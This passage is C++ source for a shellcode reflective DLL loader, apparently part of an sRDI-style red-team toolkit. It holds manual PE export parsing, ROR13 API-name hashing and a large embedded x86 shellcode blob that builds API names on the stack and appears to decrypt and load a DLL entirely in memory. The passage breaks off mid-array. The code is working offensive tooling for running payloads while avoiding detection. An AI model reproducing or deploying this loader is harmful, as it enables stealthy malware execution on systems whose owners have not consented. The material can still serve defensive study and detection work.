// RDIShellcodeCLoader.cpp : Defines the entry point for the console application.
//
// ReSharper disable CppClangTidyHicppAvoidGoto
// ReSharper disable CppClangTidyCppcoreguidelinesAvoidGoto
// ReSharper disable CppUseAuto
// ReSharper disable CppClangTidyModernizeUseAuto
// ReSharper disable CppClangTidyClangDiagnosticReservedIdMacro
// ReSharper disable CppClangTidyCppcoreguidelinesMacroUsage
// ReSharper disable once CppInconsistentNaming
// ReSharper disable CppLocalVariableMayBeConst
// ReSharper disable CppParameterMayBeConst
// ReSharper disable CppClangTidyBugproneExceptionEscape
#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <bcrypt.h>
#include <iosfwd>
#include <fstream>
#include <cstdio>

#include "resource.h"

#pragma comment(lib, "Bcrypt.lib")

#define ROTR32(value, shift)	(((DWORD) (value) >> (BYTE) (shift)) | ((DWORD) (value) << (32 - (BYTE) (shift))))
#define RVA(type, base, rva) (type)((ULONG_PTR) (base) + (rva))

FARPROC GetProcAddressR(HMODULE hModule, LPCSTR lpProcName)
{
	if (hModule == nullptr || lpProcName == nullptr)
		return nullptr;

	PIMAGE_NT_HEADERS ntHeaders = RVA(PIMAGE_NT_HEADERS, hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	PIMAGE_DATA_DIRECTORY dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (!dataDir->Size)
		return nullptr;

	PIMAGE_EXPORT_DIRECTORY exportDir = RVA(PIMAGE_EXPORT_DIRECTORY, hModule, dataDir->VirtualAddress);
	if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
		return nullptr;

	PDWORD expName = RVA(PDWORD, hModule, exportDir->AddressOfNames);
	PWORD expOrdinal = RVA(PWORD, hModule, exportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++) {

		LPCSTR expNameStr = RVA(LPCSTR, hModule, *expName);

		if (!expNameStr)
			break;

		if (!_stricmp(lpProcName, expNameStr)) {
			DWORD funcRva = *RVA(PDWORD, hModule, exportDir->AddressOfFunctions + (*expOrdinal * 4));
			return RVA(FARPROC, hModule, funcRva);
		}
	}

	return nullptr;
}

BOOL Is64BitDll(UINT_PTR uiLibraryAddress)
{
	const PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew);

	if (pNtHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) 
		return true;
	return false;
}

DWORD GetFileContents(LPCSTR filename, LPSTR* data, DWORD& size)
{
	std::FILE* fp = std::fopen(filename, "rb");

	if (fp)
	{
		fseek(fp, 0, SEEK_END);
		size = ftell(fp);
		fseek(fp, 0, SEEK_SET);

		*data = (LPSTR)malloc(size + 1);
		fread(*data, size, 1, fp);
		fclose(fp);
		return true;
	}
	return false;
}

DWORD HashFunctionName(LPSTR name) {
	DWORD hash = 0;

	do
	{
		hash = ROTR32(hash, 13);
		hash += *name;
		name++;
	} while (*(name - 1) != 0);

	return hash;
}

BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, 
	LPVOID userData, DWORD userLength, LPSTR& outBytes, DWORD& outLength, LPVOID plainInBytes)
{

	LPSTR rdiShellcode = nullptr;
	DWORD rdiShellcodeLength, dllOffset, userDataLocation;

#ifdef _DEBUG
	LPSTR rdiShellcode64 = nullptr, rdiShellcode32 = nullptr;
	DWORD rdiShellcode64Length = 0, rdiShellcode32Length = 0;
	GetFileContents("../bin/ShellcodeRDI_x64.bin", &rdiShellcode64, rdiShellcode64Length);
	GetFileContents("../bin/ShellcodeRDI_x86.bin", &rdiShellcode32, rdiShellcode32Length);

#else
	//MARKER:S
    LPSTR rdiShellcode32 = const_cast<LPSTR>("\x55\x8B\xEC\x83\xE4\xF8\x81\xEC\xBC\x02\x00\x00\x53\x56\x57\x6A\x6B\x5F\x6A\x65\x5A\x6A\x72\x59\x6A\x6E\x33\xC0\x66\x89\x94\x24\x12\x02\x00\x00\x89\x84\x24\xAC\x01\x00\x00\x89\x44\x24\x78\x89\x84\x24\x9C\x01\x00\x00\x89\x84\x24\xC4\x01\x00\x00\x89\x84\x24\xCC\x01\x00\x00\x89\x84\x24\xC8\x01\x00\x00\x89\x84\x24\x80\x02\x00\x00\x89\x84\x24\xD8\x01\x00\x00\x89\x44\x24\x6C\x89\x84\x24\xB8\x01\x00\x00\x89\x84\x24\xC0\x01\x00\x00\x89\x44\x24\x74\x89\x84\x24\xA8\x01\x00\x00\x89\x44\x24\x68\x89\x44\x24\x38\x89\x44\x24\x54\x58\x6A\x6C\x66\x89\x94\x24\x18\x02\x00\x00\x5A\x6A\x33\x66\x89\x84\x24\x16\x02\x00\x00\x58\x6A\x32\x66\x89\x84\x24\x1C\x02\x00\x00\x58\x6A\x2E\x66\x89\x84\x24\x1E\x02\x00\x00\x58\x6A\x64\x5B\x6A\x42\x66\x89\x94\x24\x1A\x02\x00\x00\x66\x89\x94\x24\x24\x02\x00\x00\x66\x89\x94\x24\x26\x02\x00\x00\x5A\x6A\x63\x66\x89\x94\x24\xE4\x01\x00\x00\x5A\x6A\x79\x66\x89\x8C\x24\x14\x02\x00\x00\x66\x89\x8C\x24\xE8\x01\x00\x00\x59\x6A\x70\x66\x89\x94\x24\xE6\x01\x00\x00\x5A\x6A\x74\x66\x89\x8C\x24\xEA\x01\x00\x00\x59\x6A\x6C\x66\x89\x84\x24\x20\x02\x00\x00\x66\x89\x84\x24\xF0\x01\x00\x00\x58\x6A\x65\x66\x89\x84\x24\xF4\x01\x00\x00\x66\x89\x84\x24\xF6\x01\x00\x00\x88\x44\x24\x7D\x58\x6A\x4C\x88\x44\x24\x7E\x88\x44\x24\x7F\x66\x89\xBC\x24\x10\x02\x00\x00\x66\x89\x9C\x24\x22\x02\x00\x00\x66\x89\x94\x24\xEC\x01\x00\x00\x66\x89\x8C\x24\xEE\x01\x00\x00\x66\x89\x9C\x24\xF2\x01\x00\x00\xC6\x44\x24\x7C\x53\x88\x94\x24\x80\x00\x00\x00\x58\x6A\x6F\x88\x84\x24\x98\x00\x00\x00\x58\x6A\x61\x88\x84\x24\x99\x00\x00\x00\x58\x6A\x69\x88\x9C\x24\x9B\x00\x00\x00\x5B\x6A\x79\x59\x6A\x41\x88\x8C\x24\xA2\x00\x00\x00\x59\x6A\x6C\x88\x8C\x24\xA3\x00\x00\x00\x88\x8C\x24\xAB\x00\x00\x00\x59\x6A\x6F\x88\x8C\x24\xAC\x00\x00\x00\x88\x8C\x24\xAD\x00\x00\x00\x59\x6A\x74\x88\x8C\x24\xAE\x00\x00\x00\x88\x8C\x24\xD9\x00\x00\x00\x59\x6A\x6E\x88\x8C\x24\xDA\x00\x00\x00\x88\x8C\x24\xDD\x00\x00\x00\x59\x6A\x74\x88\x8C\x24\x36\x01\x00\x00\x59\x6A\x63\x88\x8C\x24\x38\x01\x00\x00\x59\x6A\x6E\x88\x9C\x24\x9D\x00\x00\x00\x88\x9C\x24\xA5\x00\x00\x00\x88\x9C\x24\xD1\x00\x00\x00\x88\x9C\x24\x3D\x01\x00\x00\x5B\x6A\x43\x88\x9C\x24\x3F\x01\x00\x00\x5B\x6A\x65\x88\x8C\x24\x3B\x01\x00\x00\x88\x8C\x24\x42\x01\x00\x00\x59\x6A\x74\x88\x8C\x24\x44\x01\x00\x00\x88\x8C\x24\x09\x01\x00\x00\x88\x84\x24\x9A\x00\x00\x00\xC6\x84\x24\x9C\x00\x00\x00\x4C\x66\xC7\x84\x24\x9E\x00\x00\x00\x62\x72\x88\x84\x24\xA0\x00\x00\x00\xC6\x84\x24\xA1\x00\x00\x00\x72\xC6\x84\x24\xA4\x00\x00\x00\x56\x66\xC7\x84\x24\xA6\x00\x00\x00\x72\x74\xC6\x84\x24\xA8\x00\x00\x00\x75\x88\x84\x24\xA9\x00\x00\x00\xC6\x84\x24\xAA\x00\x00\x00\x6C\xC6\x84\x24\xAF\x00\x00\x00\x63\xC6\x84\x24\xD0\x00\x00\x00\x56\x66\xC7\x84\x24\xD2\x00\x00\x00\x72\x74\xC6\x84\x24\xD4\x00\x00\x00\x75\x88\x84\x24\xD5\x00\x00\x00\x66\xC7\x84\x24\xD6\x00\x00\x00\x6C\x50\xC6\x84\x24\xD8\x00\x00\x00\x72\x66\xC7\x84\x24\xDB\x00\x00\x00\x65\x63\xC7\x84\x24\x30\x01\x00\x00\x46\x6C\x75\x73\x66\xC7\x84\x24\x34\x01\x00\x00\x68\x49\xC6\x84\x24\x37\x01\x00\x00\x73\x66\xC7\x84\x24\x39\x01\x00\x00\x72\x75\xC6\x84\x24\x3C\x01\x00\x00\x74\xC6\x84\x24\x3E\x01\x00\x00\x6F\x88\x9C\x24\x40\x01\x00\x00\x88\x84\x24\x41\x01\x00\x00\xC6\x84\x24\x43\x01\x00\x00\x68\xC6\x84\x24\x08\x01\x00\x00\x47\x59\x6A\x79\x88\x8C\x24\x0A\x01\x00\x00\x88\x8C\x24\x0D\x01\x00\x00\x59\x6A\x6C\x88\x84\x24\x0C\x01\x00\x00\x88\x84\x24\x2B\x01\x00\x00\x58\x6A\x74\x88\x94\x24\x68\x01\x00\x00\x5A\x6A\x4F\x88\x94\x24\x69\x01\x00\x00\x5A\x6A\x65\x88\x94\x24\x6A\x01\x00\x00\x5A\x6A\x67\x88\x84\x24\x2D\x01\x00\x00\x88\x84\x24\x6F\x01\x00\x00\x58\xC6\x84\x24\x07\x01\x00\x00\x4E\xC7\x84\x24\x0A\x01\x00\x00\x69\x76\x65\x53\x88\x8C\x24\x0E\x01\x00\x00\xC7\x84\x24\x0F\x01\x00\x00\x73\x74\x65\x6D\xC7\x84\x24\x13\x01\x00\x00\x49\x6E\x66\x6F\xC7\x84\x24\x18\x01\x00\x00\x52\x74\x6C\x41\xC7\x84\x24\x1C\x01\x00\x00\x64\x64\x46\x75\xC7\x84\x24\x20\x01\x00\x00\x6E\x63\x74\x69\x66\xC7\x84\x24\x24\x01\x00\x00\x6F\x6E\xC6\x84\x24\x26\x01\x00\x00\x54\xC6\x84\x24\x28\x01\x00\x00\x62\xC6\x84\x24\x2A\x01\x00\x00\x65\xC6\x84\x24\x60\x01\x00\x00\x42\x88\x9C\x24\x61\x01\x00\x00\xC6\x84\x24\x62\x01\x00\x00\x72\x88\x8C\x24\x63\x01\x00\x00\xC6\x84\x24\x67\x01\x00\x00\x70\x88\x94\x24\x68\x01\x00\x00\x66\xC7\x84\x24\x69\x01\x00\x00\x6E\x41\x88\x84\x24\x6C\x01\x00\x00\xC7\x84\x24\x6D\x01\x00\x00\x6F\x72\x69\x74\xC7\x84\x24\x71\x01\x00\x00\x68\x6D\x50\x72\xC7\x84\x24\x75\x01\x00\x00\x6F\x76\x69\x64\x88\x94\x24\x79\x01\x00\x00\xC6\x84\x24\x7A\x01\x00\x00\x72\xC6\x84\x24\xDC\x00\x00\x00\x42\x88\x9C\x24\xDD\x00\x00\x00\xC6\x84\x24\xDE\x00\x00\x00\x72\x88\x8C\x24\xDF\x00\x00\x00\x66\xC7\x84\x24\xE0\x00\x00\x00\x70\x74\xC6\x84\x24\xE2\x00\x00\x00\x47\x88\x94\x24\xE3\x00\x00\x00\xC7\x84\x24\xE4\x00\x00\x00\x74\x50\x72\x6F\xC6\x84\x24\xE8\x00\x00\x00\x70\x88\x94\x24\xE9\x00\x00\x00\x66\xC7\x84\x24\xEA\x00\x00\x00\x72\x74\x88\x8C\x24\xEC\x00\x00\x00\xC6\x84\x24\xF0\x00\x00\x00\x42\x88\x9C\x24\xF1\x00\x00\x00\xC6\x84\x24\xF2\x00\x00\x00\x72\x88\x8C\x24\xF3\x00\x00\x00\x66\xC7\x84\x24\xF4\x00\x00\x00\x70\x74\xC6\x84\x24\xF6\x00\x00\x00\x53\x88\x94\x24\xF7\x00\x00\x00\xC7\x84\x24\xF8\x00\x00\x00\x74\x50\x72\x6F\xC6\x84\x24\xFC\x00\x00\x00\x70\x88\x94\x24\xFD\x00\x00\x00\x66\xC7\x84\x24\xFE\x00\x00\x00\x72\x74\x88\x8C\x24\x00\x01\x00\x00\xC6\x84\x24\x44\x01\x00\x00\x42\x88\x9C\x24\x45\x01\x00\x00\xC6\x84\x24\x46\x01\x00\x00\x72\x88\x8C\x24\x47\x01\x00\x00\x66\xC7\x84\x24\x48\x01\x00\x00\x70\x74\xC6\x84\x24\x4A\x01\x00\x00\x47\x88\x94\x24\x4B\x01\x00\x00\xC6\x84\x24\x4C\x01\x00\x00\x6E\x88\x94\x24\x4D\x01\x00\x00\x66\xC7\x84\x24\x4E\x01\x00\x00\x72\x61\xC6\x84\x24\x50\x01\x00\x00\x74\x6A\x74\x88\x8C\x24\x57\x01\x00\x00\x88\x8C\x24\x61\x01\x00\x00\x88\x8C\x24\xB3\x00\x00\x00\x88\x8C\x24\xBA\x00\x00\x00\x88\x8C\x24\x83\x01\x00\x00\x59\x6A\x6F\x88\x8C\x24\x85\x01\x00\x00\x59\x6A\x74\x88\x8C\x24\x88\x01\x00\x00\x88\x8C\x24\x8E\x01\x00\x00\x59\x6A\x68\x88\x8C\x24\x91\x01\x00\x00\x59\x6A\x61\x88\x8C\x24\x92\x01\x00\x00\x59\x6A\x68\x5E\x6A\x69\x88\x8C\x24\x8E\x00\x00\x00\x88\x8C\x24\xCC\x00\x00\x00\x88\x8C\x24\x86\x00\x00\x00\x66\x89\x8C\x24\x64\x02\x00\x00\x59\x88\x94\x24\x51\x01\x00\x00\xC6\x84\x24\x52\x01\x00\x00\x53\x66\xC7\x84\x24\x54\x01\x00\x00\x6D\x6D\x88\x94\x24\x56\x01\x00\x00\xC7\x84\x24\x57\x01\x00\x00\x74\x72\x69\x63\xC6\x84\x24\x5B\x01\x00\x00\x4B\x88\x94\x24\x5C\x01\x00\x00\xC6\x84\x24\xAC\x00\x00\x00\x42\x88\x9C\x24\xAD\x00\x00\x00\xC6\x84\x24\xAE\x00\x00\x00\x72\x66\xC7\x84\x24\xB0\x00\x00\x00\x70\x74\xC6\x84\x24\xB2\x00\x00\x00\x44\x88\x94\x24\xB3\x00\x00\x00\x66\xC7\x84\x24\xB4\x00\x00\x00\x63\x72\x66\xC7\x84\x24\xB7\x00\x00\x00\x70\x74\xC6\x84\x24\x7C\x01\x00\x00\x42\x88\x9C\x24\x7D\x01\x00\x00\xC6\x84\x24\x7E\x01\x00\x00\x72\xC6\x84\x24\x80\x01\x00\x00\x70\x88\x9C\x24\x82\x01\x00\x00\xC6\x84\x24\x83\x01\x00\x00\x6C\xC6\x84\x24\x85\x01\x00\x00\x73\x88\x94\x24\x86\x01\x00\x00\x66\xC7\x84\x24\x87\x01\x00\x00\x41\x6C\x88\x84\x24\x89\x01\x00\x00\x66\xC7\x84\x24\x8B\x01\x00\x00\x72\x69\xC7\x84\x24\x8F\x01\x00\x00\x6D\x50\x72\x6F\x66\xC7\x84\x24\x93\x01\x00\x00\x76\x69\xC6\x84\x24\x95\x01\x00\x00\x64\x88\x94\x24\x96\x01\x00\x00\xC6\x84\x24\x97\x01\x00\x00\x72\xC6\x84\x24\x88\x00\x00\x00\x48\x88\x94\x24\x89\x00\x00\x00\xC7\x84\x24\x8B\x00\x00\x00\x70\x41\x6C\x6C\x66\xC7\x84\x24\x8F\x00\x00\x00\x6F\x63\xC6\x84\x24\xBC\x00\x00\x00\x47\x88\x94\x24\xBD\x00\x00\x00\xC7\x84\x24\xBE\x00\x00\x00\x74\x50\x72\x6F\xC6\x84\x24\xC2\x00\x00\x00\x63\x88\x94\x24\xC3\x00\x00\x00\x66\xC7\x84\x24\xC4\x00\x00\x00\x73\x73\xC6\x84\x24\xC6\x00\x00\x00\x48\x88\x94\x24\xC7\x00\x00\x00\xC6\x84\x24\xC9\x00\x00\x00\x70\xC6\x84\x24\x80\x00\x00\x00\x48\x88\x94\x24\x81\x00\x00\x00\x66\xC7\x84\x24\x83\x00\x00\x00\x70\x46\xC6\x84\x24\x85\x00\x00\x00\x72\x88\x94\x24\x86\x00\x00\x00\x88\x94\x24\x87\x00\x00\x00\x66\x89\x9C\x24\x5C\x02\x00\x00\x66\x89\xB4\x24\x5E\x02\x00\x00\x66\x89\x8C\x24\x62\x02\x00\x00\x6A\x6E\x5A\x52\x66\x89\x84\x24\x6E\x02\x00\x00\x66\x89\x8C\x24\x6A\x02\x00\x00\x59\x6A\x4D\x66\x89\x8C\x24\x6C\x02\x00\x00\x59\x6A\x6F\x58\x6A\x64\x66\x89\x84\x24\x72\x02\x00\x00\x58\x6A\x65\x66\x89\x84\x24\x74\x02\x00\x00\x58\x6A\x42\x66\x89\x84\x24\x76\x02\x00\x00\x58\x56\x66\x89\x84\x24\x7A\x02\x00\x00\x33\xC0\x66\x89\x84\x24\x7E\x02\x00\x00\x66\x89\x9C\x24\x78\x02\x00\x00\x66\x89\x9C\x24\x7C\x02\x00\x00\x66\x89\x9C\x24\x44\x02\x00\x00\x5B\x6A\x61\x58\x6A\x69\x66\x89\x84\x24\x48\x02\x00\x00\x58\x52\x66\x89\x84\x24\x4A\x02\x00\x00\x66\x89\x84\x24\x4E\x02\x00\x00\x58\x6A\x67\x5E\x6A\x6F\x66\x89\x84\x24\x50\x02\x00\x00\x66\x89\x8C\x24\x70\x02\x00\x00\x66\x89\x8C\x24\x54\x02\x00\x00\x59\x6A\x64\x58\x6A\x65\x66\x89\x84\x24\x58\x02\x00\x00\x33\xC0\x66\x89\x84\x24\x5C\x02\x00\x00\x66\x89\x94\x24\x68\x02\x00\x00\x66\x89\x94\x24\x4C\x02\x00\x00\x5A\x6A\x42\x58\x6A\x6C\x66\x89\x84\x24\xF8\x01\x00\x00\x58\x6A\x63\x66\x89\x84\x24\xFA\x01\x00\x00\x58\x6A\x4C\x66\x89\x8C\x24\x56\x02\x00\x00\x66\x89\x8C\x24\xFC\x01\x00\x00\x59\x6A\x6E\x66\x89\x84\x24\xFE\x01\x00\x00\x58\x66\x89\x84\x24\x02\x02\x00\x00\x6A\x74\x58\x66\x89\x84\x24\x06\x02\x00\x00\x33\xC0\x66\x89\x9C\x24\x42\x02\x00\x00\x66\x89\xB4\x24\x4E\x02\x00\x00\x66\x89\x94\x24\x56\x02\x00\x00\x66\x89\xBC\x24\xFC\x01\x00\x00\x66\x89\x8C\x24\xFE\x01\x00\x00\x66\x89\x94\x24\x00\x02\x00\x00\x66\x89\xB4\x24\x04\x02\x00\x00\x66\x89\x9C\x24\x08\x02\x00\x00\x6A\x4F\x5A\x6A\x62\x66\x89\x84\x24\x0E\x02\x00\x00\x8D\xBC\x24\x84\x02\x00\x00\x58\x66\x89\x84\x24\x26\x02\x00\x00\x6A\x6A\x58\x6A\x65\x66\x89\x84\x24\x2C\x02\x00\x00\x66\x89\x94\x24\x28\x02\x00\x00\x5A\x6A\x63\x58\x66\x89\x84\x24\x2C\x02\x00\x00\x6A\x74\x58\x66\x89\x84\x24\x2E\x02\x00\x00\x66\x89\x84\x24\x38\x02\x00\x00\x33\xC0\x6A\x6E\x66\x89\x84\x24\x40\x02\x00\x00\x66\x89\x8C\x24\x34\x02\x00\x00\x59\x6A\x41\x58\x66\x89\x84\x24\xD8\x01\x00\x00\x6A\x45\x58\x66\x89\x84\x24\xDA\x01\x00\x00\x6A\x53\x58\x66\x89\x84\x24\xDC\x01\x00\x00\x33\xC0\x66\x89\x84\x24\xDE\x01\x00\x00\xAB\x66\x89\x8C\x24\x34\x02\x00\x00\x33\xC9\x66\x89\xB4\x24\x36\x02\x00\x00\x8B\xF1\x89\x4C\x24\x40\xAB\x89\x8C\x24\xB8\x01\x00\x00\x89\x8C\x24\xCC\x01\x00\x00\x89\x4C\x24\x54\xAB\x89\x4C\x24\x6C\x89\x8C\x24\xA0\x01\x00\x00\x89\x4C\x24\x60\xAB\x33\xC0\x8D\xBC\x24\x94\x02\x00\x00\x66\x89\x94\x24\x2A\x02\x00\x00\xAB\x66\x89\x94\x24\x32\x02\x00\x00\x66\x89\x9C\x24\x3A\x02\x00\x00\xAB\xAB\xAB\x8B\xF9\xB9\x13\x9C\xBF\xBD\xE8\xF2\x0C\x00\x00\xB9\xB5\x41\xD9\x5E\x89\x44\x24\x18\xE8\xE4\x0C\x00\x00\x8B\xD8\x8D\x84\x24\x0C\x02\x00\x00\x6A\x18\x89\x84\x24\xB4\x01\x00\x00\x58\x66\x89\x84\x24\xAE\x01\x00\x00\x66\x89\x84\x24\xAC\x01\x00\x00\x8D\x44\x24\x24\x50\x8D\x84\x24\xB0\x01\x00\x00\x89\x5C\x24\x2C\x50\x57\x57\xFF\x54\x24\x28\x6A\x0C\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\xA0\x00\x00\x00\x89\x44\x24\x14\x8D\x44\x24\x74\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x0E\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\xCC\x00\x00\x00\x89\x44\x24\x14\x8D\x84\x24\xC8\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x15\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x2C\x01\x00\x00\x89\x44\x24\x14\x8D\x84\x24\x98\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x13\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x04\x01\x00\x00\x89\x44\x24\x14\x8D\x84\x24\xC0\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x05\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x44\x24\x78\x89\x44\x24\x14\x8D\x84\x24\xC4\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x13\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x18\x01\x00\x00\x89\x44\x24\x14\x8D\x84\x24\x7C\x02\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x0C\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x94\x00\x00\x00\x89\x44\x24\x14\x8D\x84\x24\xA8\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x08\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x80\x00\x00\x00\x89\x44\x24\x14\x8D\x44\x24\x64\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x0E\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\xBC\x00\x00\x00\x89\x44\x24\x14\x8D\x44\x24\x34\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x6A\x09\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x88\x00\x00\x00\x89\x44\x24\x14\x8D\x44\x24\x50\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x30\xFF\xD3\x39\x74\x24\x74\x0F\x84\xEE\x0A\x00\x00\x39\xB4\x24\xC8\x01\x00\x00\x0F\x84\xE1\x0A\x00\x00\x39\xB4\x24\xC4\x01\x00\x00\x0F\x84\xD4\x0A\x00\x00\x39\xB4\x24\x98\x01\x00\x00\x0F\x84\xC7\x0A\x00\x00\x39\xB4\x24\xC0\x01\x00\x00\x0F\x84\xBA\x0A\x00\x00\x39\x74\x24\x64\x0F\x84\xB0\x0A\x00\x00\x39\x74\x24\x34\x0F\x84\xA6\x0A\x00\x00\x39\x74\x24\x50\x0F\x84\x9C\x0A\x00\x00\x6A\x14\x8D\x84\x24\xE4\x01\x00\x00\x89\x84\x24\xB4\x01\x00\x00\x58\x66\x89\x84\x24\xAE\x01\x00\x00\x66\x89\x84\x24\xAC\x01\x00\x00\x8D\x44\x24\x4C\x50\x8D\x84\x24\xB0\x01\x00\x00\x50\x57\x57\xFF\x54\x24\x28\x6A\x1B\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x60\x01\x00\x00\x89\x44\x24\x14\x8D\x84\x24\xD4\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x58\xFF\xD3\x6A\x11\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\xDC\x00\x00\x00\x89\x44\x24\x14\x8D\x44\x24\x68\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x58\xFF\xD3\x6A\x11\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\xF0\x00\x00\x00\x89\x44\x24\x14\x8D\x84\x24\xB4\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x58\xFF\xD3\x6A\x1A\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x44\x01\x00\x00\x89\x44\x24\x14\x8D\x84\x24\xBC\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x58\xFF\xD3\x6A\x0D\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\xAC\x00\x00\x00\x89\x44\x24\x14\x8D\x44\x24\x70\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x58\xFF\xD3\x6A\x1C\x58\x66\x89\x44\x24\x10\x66\x89\x44\x24\x12\x8D\x84\x24\x7C\x01\x00\x00\x89\x44\x24\x14\x8D\x84\x24\xA4\x01\x00\x00\x50\x57\x8D\x44\x24\x18\x50\xFF\x74\x24\x58\xFF\xD3\xB9\x53\xB0\x11\x0D\xE8\x65\x09\x00\x00\x8B\xC8\x8B\x84\x24\xD4\x01\x00\x00\x89\x8C\x24\x9C\x01\x00\x00\x89\x44\x24\x1C\x85\xC0\x0F\x84\x40\x09\x00\x00\x39\x74\x24\x68\x0F\x84\x36\x09\x00\x00\x39\xB4\x24\xB4\x01\x00\x00\x0F\x84\x29\x09\x00\x00\x39\xB4\x24\xBC\x01\x00\x00\x0F\x84\x1C\x09\x00\x00\x39\x74\x24\x70\x0F\x84\x12\x09\x00\x00\x39\xB4\x24\xA4\x01\x00\x00\x0F\x84\x05\x09\x00\x00\x85\xC9\x0F\x84\xFD\x08\x00\x00\x8B\x5D\x08\x8D\x94\x24\x94\x02\x00\x00\x51\x8B\xCB\xE8\xE7\x09\x00\x00\x8D\x4B\x10\x8D\x94\x24\x84\x02\x00\x00\xE8\xD8\x09\x00\x00\x59\x57\x57\x8D\x84\x24\xE0\x01\x00\x00\x50\x8D\x44\x24\x4C\x50\xFF\x54\x24\x2C\x85\xC0\x0F\x88\x58\x08\x00\x00\x57\x8D\x84\x24\xD0\x01\x00\x00\x50\x6A\x04\x8D\x84\x24\xC4\x01\x00\x00\x50\x8D\x84\x24\x34\x02\x00\x00\x50\xFF\x74\x24\x54\xFF\x94\x24\x80\x00\x00\x00\x85\xC0\x0F\x88\x2A\x08\x00\x00\xFF\xB4\x24\xB8\x01\x00\x00\x57\xFF\x54\x24\x3C\x50\xFF\x54\x24\x5C\x57\x89\x84\x24\xA4\x01\x00\x00\x8D\x84\x24\xD0\x01\x00\x00\x50\x6A\x04\x8D\x44\x24\x60\x50\x8D\x84\x24\x04\x02\x00\x00\x50\xFF\x74\x24\x54\xFF\x94\x24\x80\x00\x00\x00\x85\xC0\x0F\x88\xE7\x07\x00\x00\x6A\x10\x58\x39\x44\x24\x54\x0F\x87\xDA\x07\x00\x00\xFF\x74\x24\x54\x57\xFF\x54\x24\x3C\x50\xFF\x54\x24\x5C\x8B\xF0\x89\x74\x24\x3C\x85\xF6\x0F\x84\xBC\x07\x00\x00\x51\x8B\xD6\x8D\x8C\x24\x84\x02\x00\x00\xE8\x13\x09\x00\x00\x59\x57\x6A\x20\x58\x50\x8D\x84\x24\x64\x02\x00\x00\x50\x8D\x84\x24\x4C\x02\x00\x00\x50\xFF\x74\x24\x50\xFF\x94\x24\xC8\x01\x00\x00\x85\xC0\x0F\x88\x86\x07\x00\x00\x57\x6A\x10\x58\x50\x8D\x84\x24\x9C\x02\x00\x00\x50\xFF\xB4\x24\xC4\x01\x00\x00\x8B\x84\x24\xB0\x01\x00\x00\x50\x8D\x44\x24\x74\x50\xFF\x74\x24\x58\xFF\x94\x24\xD8\x01\x00\x00\x85\xC0\x0F\x88\x52\x07\x00\x00\x8B\x45\x18\x33\xC9\x41\x83\xC0\xE0\x51\x8D\x4C\x24\x70\x89\x44\x24\x20\x51\x33\xC9\x83\xC3\x20\x51\x51\xFF\x74\x24\x64\x56\x51\x50\x53\xFF\xB4\x24\x84\x00\x00\x00\xFF\x94\x24\x98\x00\x00\x00\x85\xC0\x0F\x88\x1A\x07\x00\x00\xFF\x74\x24\x6C\x57\xFF\x54\x24\x3C\x50\xFF\x54\x24\x5C\x8B\xF8\x89\x7C\x24\x30\x85\xFF\x0F\x84\xFE\x06\x00\x00\x33\xC0\x40\x50\x8D\x44\x24\x70\x50\xFF\x74\x24\x74\x57\xFF\x74\x24\x64\x56\x6A\x00\xFF\x74\x24\x38\x53\xFF\xB4\x24\x84\x00\x00\x00\xFF\x94\x24\x98\x00\x00\x00\x85\xC0\x0F\x88\xCE\x06\x00\x00\x8B\x77\x3C\x03\xF7\x89\x74\x24\x48\x81\x3E\x50\x45\x00\x00\x0F\x85\x21\x07\x00\x00\xB8\x4C\x01\x0